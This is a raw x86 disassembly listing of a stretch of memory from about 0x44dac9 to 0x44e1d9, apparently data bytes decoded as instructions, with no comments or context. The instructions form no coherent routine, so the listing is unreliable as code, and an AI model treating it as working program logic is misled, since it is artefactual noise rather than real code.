  44dac9:	add    al,BYTE PTR gs:[eax]
  44dacc:	add    BYTE PTR [ecx],ah
  44dace:	push   esp
  44dacf:	inc    ebx
  44dad0:	or     al,dl
  44dad2:	or     eax,DWORD PTR [eax-0x7f]
  44dad5:	and    BYTE PTR [eax+0x40],al
  44dad8:	sbb    BYTE PTR [eax+0x40],al
  44dadb:	inc    esp
  44dadc:	or     BYTE PTR [edx],al
  44dade:	add    BYTE PTR [eax],al
  44dae0:	mov    BYTE PTR [eax+0xc000082],al
  44dae6:	inc    esp
  44dae7:	adc    BYTE PTR [eax+0x98004c],al
  44daed:	sub    BYTE PTR [eax],ah
  44daef:	nop
  44daf0:	add    BYTE PTR [eax],dl
  44daf2:	xor    BYTE PTR [edx+0x50],al
  44daf5:	inc    ecx
  44daf6:	add    al,0x2c
  44daf8:	imul   esp,DWORD PTR [eax],0x8004601c
  44dafe:	and    BYTE PTR [eax],al
  44db00:	add    DWORD PTR [edx+0x24],eax
  44db03:	inc    esp
  44db04:	add    BYTE PTR [esp+eax*4+0x65],0x0
  44db09:	add    al,BYTE PTR [esi+0x20]
  44db0c:	add    al,0x33
  44db0e:	add    BYTE PTR [eax+0x50],al
  44db11:	push   ss
  44db12:	add    bl,BYTE PTR [edx]
  44db14:	and    BYTE PTR [eax+0x40],al
  44db17:	inc    eax
  44db18:	inc    eax
  44db19:	add    DWORD PTR [eax],0x81001480
  44db1f:	adc    BYTE PTR [eax],dl
  44db21:	sub    al,BYTE PTR [eax]
  44db23:	push   cs
  44db24:	and    BYTE PTR [eax],ch
  44db26:	add    DWORD PTR [edx+0x0],edx
  44db29:	or     BYTE PTR [eax+0x0],cl
  44db2c:	dec    esp
  44db2d:	push   es
  44db2e:	rol    BYTE PTR [eax],0x91
  44db31:	add    DWORD PTR [ebx-0x68],eax
  44db34:	inc    ecx
  44db35:	add    al,ah
  44db37:	and    cl,BYTE PTR [edx+0xb]
  44db3a:	and    eax,0x8000
  44db3f:	add    BYTE PTR [eax],al
  44db41:	adc    BYTE PTR [eax+0x51000],0x18
  44db48:	inc    esi
  44db49:	mov    eax,0x200025
  44db4e:	add    BYTE PTR [ecx],al
  44db50:	inc    eax
  44db51:	inc    ebx
  44db52:	add    BYTE PTR [eax],al
  44db54:	xor    al,0x41
  44db56:	inc    esp
  44db57:	add    eax,DWORD PTR [eax]
  44db59:	pop    eax
  44db5a:	pusha  
  44db5b:	xor    BYTE PTR [eax],ch
  44db5d:	inc    eax
  44db5e:	push   es
  44db5f:	inc    edx
  44db60:	add    BYTE PTR [ebp+0x21],0x81
  44db64:	add    eax,esp
  44db66:	rol    esp,1
  44db68:	and    BYTE PTR [eax],bl
  44db6a:	add    BYTE PTR [eax],ah
  44db6c:	add    BYTE PTR [eax*1+0x821],0x20
  44db74:	add    BYTE PTR [eax],cl
  44db76:	add    BYTE PTR [eax],cl
  44db78:	adc    cl,BYTE PTR [ecx+0x50]
  44db7b:	add    DWORD PTR [eax],eax
  44db7d:	xor    DWORD PTR [eax],eax
  44db7f:	adc    BYTE PTR [eax+eax*4],al
  44db82:	add    BYTE PTR [eax],ah
  44db84:	inc    ebx
  44db85:	push   ecx
  44db86:	je     0x44db88
  44db88:	and    DWORD PTR [eax+0x16],eax
  44db8b:	add    BYTE PTR [edx],cl
  44db8d:	add    BYTE PTR [eax+0x0],al
  44db90:	push   es
  44db91:	add    al,0x4e
  44db93:	inc    eax
  44db94:	add    ah,BYTE PTR [ecx+0x44]
  44db97:	add    BYTE PTR [eax],dl
  44db99:	cmp    BYTE PTR [edx],0x20
  44db9c:	add    BYTE PTR [ecx+edx*1],cl
  44db9f:	add    BYTE PTR [eax-0x6e],al
  44dba2:	dec    eax
  44dba3:	add    BYTE PTR [esi],al
  44dba5:	add    BYTE PTR [eax+0xc],ah
  44dba8:	inc    esp
  44dba9:	mov    ecx,0x59001248
  44dbae:	and    BYTE PTR [eax+0x10],ah
  44dbb1:	or     BYTE PTR [eax+eax*4],cl
  44dbb4:	lea    ecx,es:[edx+eax*2]
  44dbb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44dbb9:	add    DWORD PTR [eax+0x20010180],edx
  44dbbf:	or     BYTE PTR [eax],dl
  44dbc1:	add    BYTE PTR [edx+0x0],ch
  44dbc4:	inc    eax
  44dbc5:	jmp    0x405e3d1c
  44dbca:	and    DWORD PTR [eax-0x80],ecx
  44dbcd:	add    BYTE PTR [ebp+0x408004],dl
  44dbd3:	inc    ecx
  44dbd4:	adc    DWORD PTR [eax],ecx
  44dbd6:	add    BYTE PTR [eax+0x8],cl
  44dbd9:	sbb    BYTE PTR [eax],ah
  44dbdb:	and    eax,0x8000218
  44dbe0:	adc    dh,BYTE PTR [eax]
  44dbe2:	pop    DWORD PTR [edx+eax*1]
  44dbe5:	mov    BYTE PTR [eax],dl
  44dbe7:	add    BYTE PTR [eax],al
  44dbe9:	add    BYTE PTR [ecx],al
  44dbeb:	inc    eax
  44dbec:	or     al,BYTE PTR [eax]
  44dbee:	add    BYTE PTR [esi+0x40028040],al
  44dbf4:	or     BYTE PTR [ecx],al
  44dbf6:	add    BYTE PTR [eax],ah
  44dbf8:	arpl   dx,si
  44dbfa:	add    al,0xa
  44dbfc:	inc    eax
  44dbfd:	xchg   ecx,eax
  44dbfe:	stos   DWORD PTR es:[edi],eax
  44dbff:	adc    BYTE PTR [eax],0x40
  44dc02:	add    BYTE PTR [eax*1+0x13001],cl
  44dc09:	lods   al,BYTE PTR ds:[esi]
  44dc0a:	inc    ebp
  44dc0b:	add    BYTE PTR [eax],cl
  44dc0d:	adc    eax,0x40418038
  44dc12:	or     al,cl
  44dc14:	or     al,0x0
  44dc16:	mov    al,ds:0x2c54422
  44dc1b:	or     DWORD PTR [eax],edx
  44dc1d:	or     BYTE PTR [eax],al
  44dc1f:	add    BYTE PTR [eax],al
  44dc21:	test   BYTE PTR [eax+0x29260010],al
  44dc27:	shl    BYTE PTR [eax-0x7f],1
  44dc2a:	add    DWORD PTR [eax+0x2634c27a],eax
  44dc30:	push   ss
  44dc31:	and    BYTE PTR [eax],dl
  44dc33:	dec    eax
  44dc34:	dec    ecx
  44dc35:	sbb    al,BYTE PTR [eax]
  44dc37:	ret    0x3a40
  44dc3a:	and    al,0x0
  44dc3c:	or     DWORD PTR [ecx+0x6c6011],0x10100132
  44dc46:	add    DWORD PTR ds:0x80142842,eax
  44dc4c:	imul   eax,DWORD PTR [eax],0x80026400
  44dc52:	sub    BYTE PTR [eax],cl
  44dc54:	add    cl,BYTE PTR [edx]
  44dc56:	add    DWORD PTR [edx+0x201c141],ecx
  44dc5c:	test   al,0x0
  44dc5e:	add    BYTE PTR [ecx],al
  44dc60:	and    BYTE PTR [edx],ch
  44dc62:	inc    eax
  44dc63:	add    al,0x0
  44dc65:	or     BYTE PTR [eax+0x40020040],al
  44dc6b:	add    BYTE PTR [eax],al
  44dc6d:	add    BYTE PTR [eax],al
  44dc6f:	add    BYTE PTR [eax],al
  44dc71:	add    BYTE PTR [eax-0x38],ch
  44dc74:	enter  0x41,0x60
  44dc78:	add    eax,0x444c4008
  44dc7d:	add    BYTE PTR [eax-0x4abdfe00],al
  44dc83:	nop
  44dc84:	add    DWORD PTR [eax],eax
  44dc86:	test   BYTE PTR [ecx-0x72],al
  44dc89:	add    DWORD PTR [eax-0x7f],ecx
  44dc8c:	add    BYTE PTR [eax],cl
  44dc8e:	lds    ecx,FWORD PTR [edx]
  44dc90:	and    BYTE PTR [edx],dl
  44dc92:	add    DWORD PTR [eax],eax
  44dc94:	add    BYTE PTR [edx],dl
  44dc96:	dec    eax
  44dc97:	add    BYTE PTR [edx],al
  44dc99:	add    BYTE PTR [ebx+0x24],al
  44dc9c:	pusha  
  44dc9d:	add    al,BYTE PTR [eax]
  44dc9f:	add    BYTE PTR [edx],cl
  44dca1:	add    DWORD PTR [eax+0x40010990],esi
  44dca7:	loop   0x44dc30
  44dca9:	add    al,BYTE PTR [esp+eax*4-0x74]
  44dcad:	or     BYTE PTR [eax],al
  44dcaf:	les    eax,FWORD PTR [eax+ecx*4]
  44dcb2:	sub    BYTE PTR [eax],dl
  44dcb4:	add    BYTE PTR [eax],al
  44dcb6:	or     BYTE PTR [eax+0x42a00020],al
  44dcbc:	adc    BYTE PTR [eax-0x78],al
  44dcbf:	xor    BYTE PTR [eax],al
  44dcc1:	mov    al,ds:0x4c04000a
  44dcc6:	sub    DWORD PTR [eax+ecx*2],0x41844
  44dccd:	retf   0x8200
  44dcd0:	mov    al,ds:0x4783840
  44dcd5:	nop
  44dcd6:	add    BYTE PTR [eax],dl
  44dcd8:	add    BYTE PTR [esp+eax*2],cl
  44dcdb:	inc    eax
  44dcdc:	or     BYTE PTR [eax+0x20],al
  44dcdf:	add    BYTE PTR [eax],cl
  44dce1:	add    al,0xa0
  44dce3:	inc    eax
  44dce4:	mov    al,BYTE PTR [eax+0x6]
  44dce7:	adc    BYTE PTR [eax],al
  44dce9:	adc    dl,al
  44dceb:	add    DWORD PTR [eax],0x80004001
  44dcf1:	add    BYTE PTR [eax+0xcc06126],al
  44dcf7:	inc    eax
  44dcf8:	or     BYTE PTR [eax+eax*1],al
  44dcfb:	inc    eax
  44dcfc:	mov    al,ds:0x4210f810
  44dd01:	xor    al,BYTE PTR ds:0xc8080080
  44dd07:	inc    eax
  44dd08:	adc    BYTE PTR [ecx],al
  44dd0a:	add    BYTE PTR [edx+0xd90c40],ch
  44dd10:	inc    esp
  44dd11:	sub    BYTE PTR [ecx+eax*1],al
  44dd14:	or     al,0x88
  44dd16:	test   al,0x80
  44dd18:	jmp    0x4455d9d
  44dd1d:	sbb    BYTE PTR [eax+0x0],ah
  44dd20:	pusha  
  44dd21:	adc    al,0x0
  44dd23:	add    BYTE PTR [eax+edx*1+0x41],al
  44dd27:	sbb    BYTE PTR [esi],dl
  44dd29:	mov    esp,0x1281440
  44dd2e:	add    BYTE PTR [eax+eax*4],al
  44dd31:	pop    eax
  44dd32:	inc    eax
  44dd33:	adc    al,al
  44dd35:	inc    eax
  44dd36:	and    BYTE PTR [eax+eax*1],al
  44dd39:	inc    ecx
  44dd3a:	add    ch,BYTE PTR [ecx]
  44dd3c:	and    BYTE PTR [ecx+0x10cc1135],al
  44dd42:	and    BYTE PTR [eax+0x1003030],ah
  44dd48:	add    DWORD PTR [ecx+0x1a],eax
  44dd4b:	push   eax
  44dd4c:	adc    eax,0x900006
  44dd51:	inc    ecx
  44dd52:	test   BYTE PTR [eax],dl
  44dd54:	xor    DWORD PTR [eax],eax
  44dd56:	adc    DWORD PTR [edi],ecx
  44dd58:	add    BYTE PTR [edx],cl
  44dd5a:	mov    al,ds:0x600d001e
  44dd5f:	inc    eax
  44dd60:	add    al,0x98
  44dd62:	and    al,0xc0
  44dd64:	add    BYTE PTR [eax],al
  44dd66:	jmp    0x2020:0x52401221
  44dd6d:	adc    BYTE PTR [esi],al
  44dd6f:	add    BYTE PTR [eax],cl
  44dd71:	or     BYTE PTR [eax],dl
  44dd73:	sub    BYTE PTR [eax],al
  44dd75:	add    al,0x0
  44dd77:	sub    DWORD PTR [ecx],eax
  44dd79:	and    BYTE PTR [ecx],dl
  44dd7b:	add    BYTE PTR [eax+eax*1],dh
  44dd7e:	or     DWORD PTR [eax+0x0],ebp
  44dd81:	add    BYTE PTR [eax],al
  44dd83:	and    BYTE PTR ds:0x4080486,al
  44dd89:	nop
  44dd8a:	mov    eax,ds:0x2000b420
  44dd8f:	add    DWORD PTR [ecx+0x6647120],ecx
  44dd95:	and    DWORD PTR [ecx+0x4],eax
  44dd98:	add    BYTE PTR [ebp+0x0],al
  44dd9b:	nop
  44dd9c:	add    BYTE PTR [eax],al
  44dd9e:	and    al,0x5
  44dda0:	inc    ebp
  44dda1:	add    BYTE PTR [ecx],al
  44dda3:	or     BYTE PTR [ecx],ah
  44dda5:	and    DWORD PTR [eax-0x7d2264fd],edx
  44ddab:	and    BYTE PTR [eax+0x800108b],al
  44ddb1:	and    DWORD PTR [eax+eax*4],esi
  44ddb4:	or     BYTE PTR [edx],dl
  44ddb6:	mov    al,0x2
  44ddb8:	add    eax,0x10420068
  44ddbd:	and    DWORD PTR [edx],ebx
  44ddbf:	add    ah,BYTE PTR [eax+0x5a]
  44ddc2:	dec    eax
  44ddc3:	xor    DWORD PTR [eax+eax*1],eax
  44ddc6:	or     al,BYTE PTR [ebx+edx*4-0x3fd5acc0]
  44ddcd:	add    al,al
  44ddcf:	push   eax
  44ddd0:	push   es
  44ddd1:	add    BYTE PTR [eax],bl
  44ddd3:	add    al,0x80
  44ddd5:	add    DWORD PTR [eax+0x10],ecx
  44ddd8:	add    BYTE PTR [ecx+0x2003850],cl
  44ddde:	adc    BYTE PTR [edx+0x42],cl
  44dde1:	sub    BYTE PTR [eax+0xb],0x2
  44dde5:	rcr    DWORD PTR [edx],1
  44dde7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44dde8:	or     DWORD PTR [edx],eax
  44ddea:	add    BYTE PTR ds:0x8228010,cl
  44ddf0:	add    al,0x40
  44ddf2:	add    BYTE PTR [eax],ch
  44ddf4:	add    BYTE PTR ds:0x29014024,ah
  44ddfa:	sbb    BYTE PTR [ecx],cl
  44ddfc:	add    BYTE PTR [ecx+0x1894108],0x43
  44de03:	add    DWORD PTR [eax],eax
  44de05:	add    BYTE PTR [eax],ah
  44de07:	nop
  44de08:	add    BYTE PTR [eax],cl
  44de0a:	adc    eax,0x44800090
  44de0f:	push   ebx
  44de10:	adc    BYTE PTR gs:[edx+ecx*1-0x37fd2d7a],ch
  44de18:	pusha  
  44de19:	dec    ecx
  44de1a:	adc    BYTE PTR [eax],al
  44de1c:	inc    eax
  44de1d:	adc    DWORD PTR [ecx],edx
  44de1f:	add    dl,BYTE PTR [ecx+0x24006998]
  44de25:	inc    eax
  44de26:	add    DWORD PTR [esi-0x6e],0x44
  44de2a:	pusha  
  44de2b:	or     BYTE PTR [eax],dl
  44de2d:	add    BYTE PTR [ebx+0x2d88245],ah
  44de33:	nop
  44de34:	add    BYTE PTR [eax],al
  44de36:	adc    BYTE PTR [ecx+0x0],0x83
  44de3a:	push   eax
  44de3b:	adc    BYTE PTR [eax+eax*1],0x82
  44de3f:	add    BYTE PTR [ecx+0x24],ah
  44de42:	add    DWORD PTR [eax+0x0],esi
  44de45:	and    BYTE PTR [eax],al
  44de47:	and    DWORD PTR [eax+0x20],0x40240820
  44de4e:	nop
  44de4f:	add    BYTE PTR [eax],al
  44de51:	adc    al,0x14
  44de53:	rol    BYTE PTR [edx-0x7fbff764],0x80
  44de5a:	add    BYTE PTR [eax],0x4
  44de5d:	inc    ecx
  44de5e:	add    BYTE PTR [eax],dl
  44de60:	js     0x44de62
  44de62:	xchg   esi,eax
  44de63:	inc    eax
  44de64:	add    al,BYTE PTR [eax]
  44de66:	dec    eax
  44de67:	and    BYTE PTR [eax-0x7c],ah
  44de6a:	or     BYTE PTR [edx+0x70],al
  44de6d:	add    BYTE PTR [eax],al
  44de6f:	mov    eax,ds:0x68020008
  44de74:	add    edx,DWORD PTR [eax]
  44de76:	dec    eax
  44de77:	or     eax,0x40200a
  44de7c:	add    BYTE PTR [eax],cl
  44de7e:	inc    ecx
  44de7f:	inc    ecx
  44de80:	sbb    BYTE PTR [eax],al
  44de82:	add    BYTE PTR [esi+0x8111000],0xc
  44de89:	add    BYTE PTR [eax+ecx*1+0x13],bl
  44de8d:	add    BYTE PTR [eax+ebp*1],al
  44de90:	inc    eax
  44de91:	add    BYTE PTR [eax],al
  44de93:	adc    BYTE PTR [eax],al
  44de95:	xchg   esp,eax
  44de96:	push   es
  44de97:	add    BYTE PTR [eax],al
  44de99:	add    DWORD PTR [ecx+edi*2],eax
  44de9c:	add    eax,0x24109
  44dea1:	xor    BYTE PTR [eax+0x30a82108],cl
  44dea7:	adc    BYTE PTR [eax],ah
  44dea9:	or     al,BYTE PTR [eax+eax*4-0x30]
  44dead:	inc    ecx
  44deae:	sbb    BYTE PTR [ecx],al
  44deb0:	inc    esp
  44deb1:	and    BYTE PTR [eax],al
  44deb3:	push   ecx
  44deb4:	add    BYTE PTR [eax+0x11],al
  44deb7:	add    BYTE PTR [eax],dl
  44deb9:	or     BYTE PTR [eax],0x0
  44debc:	add    BYTE PTR [eax],dh
  44debe:	and    BYTE PTR [edx+0x0],al
  44dec1:	inc    eax
  44dec2:	test   DWORD PTR [ecx+0x42],esp
  44dec5:	and    al,0x8
  44dec7:	test   al,0x0
  44dec9:	add    eax,0x4048124
  44dece:	inc    eax
  44decf:	sub    eax,0x34810a00
  44ded4:	or     BYTE PTR [esi],dh
  44ded6:	add    BYTE PTR [edx+0x60],al
  44ded9:	and    BYTE PTR [ecx+eiz*2],al
  44dedc:	or     BYTE PTR [eax+eax*1],0x11
  44dee0:	add    BYTE PTR [edx+0x9200800],al
  44dee6:	and    BYTE PTR [edx],al
  44dee8:	dec    eax
  44dee9:	fs inc ecx
  44deeb:	add    al,0x12
  44deed:	adc    BYTE PTR [eax],al
  44deef:	inc    ecx
  44def0:	and    BYTE PTR [eax],al
  44def2:	and    BYTE PTR [edx+0x806400],cl
  44def8:	inc    eax
  44def9:	add    BYTE PTR [edx+0x9401109],al
  44deff:	cdq    
  44df00:	pop    es
  44df01:	adc    BYTE PTR [eax+0x2],al
  44df04:	adc    BYTE PTR [eax],ah
  44df06:	add    al,BYTE PTR [eax+0x100000]
  44df0c:	rol    BYTE PTR [eax],0x0
  44df0f:	adc    BYTE PTR [eax+0x0],ah
  44df15:	inc    esi
  44df16:	pop    eax
  44df17:	or     BYTE PTR [eax],al
  44df19:	inc    eax
  44df1a:	xchg   ecx,eax
  44df1b:	cmp    BYTE PTR [eax],0x89
  44df1e:	add    al,0x8
  44df20:	or     cl,BYTE PTR [eax]
  44df22:	or     BYTE PTR [ecx],dh
  44df24:	pusha  
  44df25:	push   eax
  44df26:	add    BYTE PTR [eax],ch
  44df28:	add    BYTE PTR [eax],al
  44df2a:	inc    ecx
  44df2b:	nop
  44df2c:	add    BYTE PTR [eax],dl
  44df2e:	add    BYTE PTR [esp+ecx*1],ah
  44df31:	xchg   DWORD PTR [ebx],eax
  44df33:	mov    al,ds:0x2d5
  44df38:	add    BYTE PTR [eax-0x80],ah
  44df3b:	add    cl,BYTE PTR [eax-0x7ffefff0]
  44df41:	or     al,0xa0
  44df43:	add    BYTE PTR [edx],cl
  44df45:	sub    BYTE PTR [eax+0x30],al
  44df48:	cmp    BYTE PTR [eax+0x10],cl
  44df4b:	or     al,0x0
  44df4d:	arpl   WORD PTR [edx],sp
  44df4f:	sub    al,BYTE PTR [eax]
  44df51:	mov    bl,0x14
  44df53:	add    BYTE PTR [ecx-0x80],0x24
  44df57:	add    BYTE PTR [eax],0x20
  44df5a:	add    al,0x21
  44df5c:	es stos BYTE PTR es:[edi],al
  44df5e:	add    BYTE PTR [eax],ah
  44df60:	add    BYTE PTR [eax+eiz*1+0x50000500],0x55
  44df68:	add    BYTE PTR [esp],al
  44df6b:	add    DWORD PTR [edx],eax
  44df6d:	mov    BYTE PTR [eax],ah
  44df6f:	add    BYTE PTR [eax],al
  44df71:	add    cl,BYTE PTR [eax]
  44df73:	adc    BYTE PTR [eax],0xa0
  44df76:	add    DWORD PTR [ecx],0x18420002
  44df7c:	and    eax,DWORD PTR [eax]
  44df7e:	inc    eax
  44df7f:	cmp    BYTE PTR [edx],ah
  44df81:	add    BYTE PTR [eax+ecx*1],al
  44df84:	add    BYTE PTR [ebx-0x6f],al
  44df87:	or     al,0x8
  44df89:	adc    BYTE PTR [eax],al
  44df8b:	adc    ah,BYTE PTR [eax]
  44df8d:	add    al,al
  44df8f:	data16 or BYTE PTR [eax],dl
  44df92:	mov    BYTE PTR [eax],bl
  44df94:	add    cl,cl
  44df96:	add    DWORD PTR [eax+0x0],esi
  44df99:	or     al,BYTE PTR [eax]
  44df9b:	shl    DWORD PTR [ecx+0x2],0x1
  44df9f:	or     BYTE PTR [edx],al
  44dfa1:	jo     0x44dfea
  44dfa3:	sbb    al,BYTE PTR [eax]
  44dfa5:	adc    BYTE PTR [edx],0x0
  44dfa8:	sub    BYTE PTR [edx],bl
  44dfaa:	add    BYTE PTR [eax],0x4
  44dfad:	add    BYTE PTR [edx],cl
  44dfaf:	add    BYTE PTR [ecx],cl
  44dfb1:	or     DWORD PTR [eax+0x0],0xc806000
  44dfb8:	pop    es
  44dfb9:	add    BYTE PTR [eax],al
  44dfbb:	sbb    eax,DWORD PTR [eax+0x8000200]
  44dfc1:	add    BYTE PTR [eax],al
  44dfc3:	adc    al,0x29
  44dfc5:	mov    BYTE PTR [eax-0x6affbdc0],ah
  44dfcb:	inc    eax
  44dfcc:	inc    eax
  44dfcd:	nop
  44dfce:	inc    eax
  44dfcf:	or     BYTE PTR [eax],ah
  44dfd1:	add    BYTE PTR [eax+eax*1+0x480000c8],al
  44dfd8:	dec    eax
  44dfd9:	push   ss
  44dfda:	add    BYTE PTR [eax+eax*4+0x2],ch
  44dfde:	inc    eax
  44dfdf:	add    BYTE PTR [ebx+0xd4080],al
  44dfe5:	adc    BYTE PTR ds:0x1014008,al
  44dfeb:	mov    BYTE PTR [eax-0x60],dl
  44dfee:	inc    ebx
  44dfef:	xor    al,BYTE PTR [eax]
  44dff1:	add    BYTE PTR [eax],al
  44dff3:	dec    eax
  44dff4:	add    BYTE PTR [eax],cl
  44dff6:	loop   0x44e002
  44dff8:	adc    BYTE PTR [eax-0x80],al
  44dffb:	and    al,0x8
  44dffd:	dec    eax
  44dffe:	or     DWORD PTR [eax+0xc80422],eax
  44e004:	add    al,0x48
  44e006:	sub    BYTE PTR [ebp+0x10428500],dl
  44e00c:	and    BYTE PTR [eax],0x11
  44e00f:	add    BYTE PTR [eax],al
  44e011:	push   eax
  44e012:	pusha  
  44e013:	sub    BYTE PTR [eax],al
  44e015:	add    BYTE PTR [ebx+0x8090280],cl
  44e01b:	or     DWORD PTR [ecx+0x8],eax
  44e01e:	add    DWORD PTR [edx+0x0],0xb0a1151
  44e025:	rol    BYTE PTR [eax],0x8e
  44e028:	add    bl,BYTE PTR [eax]
  44e02a:	add    BYTE PTR [eax],al
  44e02c:	adc    DWORD PTR [eax],eax
  44e02e:	adc    BYTE PTR [eax+edx*1],cl
  44e031:	add    BYTE PTR [ecx],al
  44e033:	sbb    BYTE PTR [eax+0x51],0xc2
  44e037:	inc    eax
  44e038:	add    BYTE PTR [ebx],cl
  44e03a:	add    DWORD PTR [eax+0x43],edi
  44e03d:	add    BYTE PTR [eax+0x42],al
  44e040:	adc    BYTE PTR [edx],al
  44e042:	and    BYTE PTR [edx],ah
  44e044:	add    BYTE PTR [eax],al
  44e046:	mov    al,cl
  44e048:	lds    eax,FWORD PTR [ecx]
  44e04a:	or     al,BYTE PTR [eax]
  44e04c:	cwde   
  44e04d:	jo     0x44dfcf
  44e04f:	add    BYTE PTR [eax],al
  44e051:	adc    DWORD PTR [eax],eax
  44e053:	add    DWORD PTR [eax],eax
  44e055:	add    BYTE PTR [eax+0x24],al
  44e058:	add    BYTE PTR [eax],dl
  44e05a:	inc    ecx
  44e05b:	daa    
  44e05c:	inc    eax
  44e05d:	push   esp
  44e05e:	add    ah,BYTE PTR [eax-0x72dcefdc]
  44e064:	and    BYTE PTR [eax+eax*1+0x40810020],dl
  44e06b:	add    BYTE PTR [eax],ah
  44e06d:	inc    edx
  44e06e:	add    al,BYTE PTR [esi-0x7ffbbfdf]
  44e074:	and    BYTE PTR [ecx],ah
  44e076:	add    BYTE PTR [eax],dh
  44e078:	add    BYTE PTR ds:0xc0a82900,al
  44e07e:	adc    dl,BYTE PTR [eax]
  44e080:	add    BYTE PTR [eax],0x1
  44e083:	or     DWORD PTR [edx],eax
  44e085:	adc    BYTE PTR [ecx-0x2e],dl
  44e088:	add    BYTE PTR [eax],al
  44e08a:	adc    BYTE PTR [eax+eax*1],al
  44e08d:	add    BYTE PTR [eax],bl
  44e08f:	or     BYTE PTR [eax],al
  44e091:	push   cs
  44e092:	adc    al,0x8
  44e094:	add    BYTE PTR [edx+0x0],0x2a
  44e098:	adc    al,BYTE PTR [eax]
  44e09a:	hlt    
  44e09b:	add    DWORD PTR [ecx],esp
  44e09d:	add    BYTE PTR [eax],dl
  44e09f:	inc    esp
  44e0a0:	inc    esp
  44e0a1:	add    BYTE PTR [edx+0x10],ah
  44e0a4:	add    BYTE PTR [eax],al
  44e0a6:	inc    eax
  44e0a7:	add    BYTE PTR [eax],al
  44e0a9:	add    al,0x0
  44e0ab:	or     BYTE PTR [eax],al
  44e0ad:	push   es
  44e0ae:	push   ss
  44e0af:	add    DWORD PTR [eax+0x2],ecx
  44e0b2:	rcr    BYTE PTR [edx+0x8002223],0x0
  44e0b9:	add    BYTE PTR [eax],0x0
  44e0bc:	adc    BYTE PTR [eax],al
  44e0be:	and    DWORD PTR [eax+0x48],eax
  44e0c1:	adc    BYTE PTR [eax+0x44],dl
  44e0c4:	inc    esi
  44e0c5:	add    al,0x42
  44e0c7:	and    BYTE PTR [ecx+eax*1+0x1],0x29
  44e0cc:	and    al,BYTE PTR [ecx]
  44e0ce:	test   BYTE PTR [eax],cl
  44e0d0:	sbb    BYTE PTR [eax],dl
  44e0d2:	or     dl,BYTE PTR [eax]
  44e0d4:	inc    esp
  44e0d5:	or     BYTE PTR [ebx],dl
  44e0d7:	inc    eax
  44e0d8:	inc    eax
  44e0d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e0da:	add    BYTE PTR [eax],al
  44e0dc:	sub    BYTE PTR [esi],0x90
  44e0df:	mov    BYTE PTR [eax],0x18
  44e0e2:	add    al,cl
  44e0e4:	rcr    BYTE PTR [eax+0x0],0x5
  44e0e8:	push   eax
  44e0e9:	sub    BYTE PTR [edx+ecx*4],al
  44e0ec:	inc    eax
  44e0ed:	xor    dh,BYTE PTR [edx+0xc]
  44e0f0:	add    BYTE PTR [eax],al
  44e0f2:	adc    BYTE PTR [eax],al
  44e0f4:	add    BYTE PTR [eax],ah
  44e0f6:	add    al,BYTE PTR [eax]
  44e0f8:	add    DWORD PTR [eax+eax*2],eax
  44e0fb:	sub    DWORD PTR [esp+eax*2],eax
  44e0fe:	add    BYTE PTR [eax],al
  44e100:	or     BYTE PTR [ebp+0x6880c510],al
  44e106:	adc    eax,0xa00c01
  44e10b:	rcl    BYTE PTR [edx],0x20
  44e10e:	add    BYTE PTR [eax],dl
  44e110:	add    al,0xc0
  44e112:	add    BYTE PTR [edx],al
  44e114:	add    DWORD PTR [eax],ecx
  44e116:	or     BYTE PTR [eax+eiz*1],al
  44e119:	or     BYTE PTR [eax+0x0],cl
  44e11c:	adc    BYTE PTR [eax],ch
  44e11e:	rol    BYTE PTR [eax+0x3],0x14
  44e122:	adc    DWORD PTR [eax-0xf4feffc],eax
  44e128:	add    DWORD PTR [ecx+0x800600],esp
  44e12e:	sbb    al,0x8
  44e130:	push   cs
  44e131:	add    al,al
  44e133:	or     DWORD PTR [eax+eax*1],eax
  44e136:	add    cl,BYTE PTR [eax]
  44e138:	popa   
  44e139:	add    BYTE PTR [eax],dl
  44e13b:	inc    eax
  44e13c:	inc    eax
  44e13d:	mov    BYTE PTR [eax],cl
  44e13f:	add    BYTE PTR [ecx+eax*1],al
  44e142:	sub    BYTE PTR [eax+eiz*1],al
  44e145:	inc    eax
  44e146:	add    BYTE PTR [eax+0x4],0x0
  44e14a:	add    BYTE PTR [eax+0x0],0x9
  44e14e:	and    BYTE PTR [eax],al
  44e150:	inc    eax
  44e151:	or     BYTE PTR [ecx+0x16b2091],al
  44e157:	and    al,BYTE PTR [ecx+0x11]
  44e15a:	mov    al,ds:0xa0003901
  44e15f:	add    BYTE PTR [eax+0x0],cl
  44e162:	dec    ebx
  44e163:	inc    ebx
  44e164:	add    BYTE PTR [edx],0x5
  44e167:	inc    ecx
  44e168:	xchg   ebx,eax
  44e169:	dec    edx
  44e16a:	xchg   ecx,eax
  44e16b:	add    BYTE PTR [ecx+0x2400c410],al
  44e171:	lds    edx,FWORD PTR [eax-0x7bffbe6d]
  44e177:	add    BYTE PTR [eax],al
  44e179:	add    BYTE PTR [eax],cl
  44e17b:	add    dl,BYTE PTR [eax+eax*1+0x41b60040]
  44e182:	mov    BYTE PTR [eax+0x21],bl
  44e185:	mov    al,BYTE PTR [eax+0x600800]
  44e18b:	inc    eax
  44e18c:	inc    ecx
  44e18d:	push   es
  44e18e:	and    al,BYTE PTR [eax]
  44e190:	sbb    BYTE PTR [eax+0x24],cl
  44e193:	sbb    BYTE PTR [edx],cl
  44e195:	add    al,BYTE PTR [eax+0xe]
  44e198:	shl    BYTE PTR [ecx+0x44002412],1
  44e19e:	pusha  
  44e19f:	inc    edi
  44e1a0:	push   eax
  44e1a1:	sbb    BYTE PTR [eax],al
  44e1a3:	mov    eax,ds:0x40e00a9
  44e1a8:	ret    0x4801
  44e1ab:	add    BYTE PTR [eax],dl
  44e1ad:	mov    al,ds:0x61410640
  44e1b2:	test   dl,cl
  44e1b4:	adc    DWORD PTR [edx],0x80420000
  44e1ba:	add    BYTE PTR [edx],al
  44e1bc:	inc    eax
  44e1bd:	add    al,0x8
  44e1bf:	add    al,0xb4
  44e1c1:	jb     0x44e213
  44e1c3:	add    BYTE PTR [eax-0x48],cl
  44e1c6:	add    BYTE PTR [eax],dl
  44e1c8:	inc    eax
  44e1c9:	push   eax
  44e1ca:	adc    dl,BYTE PTR [eax]
  44e1cc:	add    BYTE PTR [eax+0x0],al
  44e1cf:	or     BYTE PTR [ecx+0x11829],ch
  44e1d5:	add    BYTE PTR [eax],al
  44e1d7:	inc    ebx
  44e1d8:	inc    eax
  44e1d9:	sub    BYTE PTR [eax],al
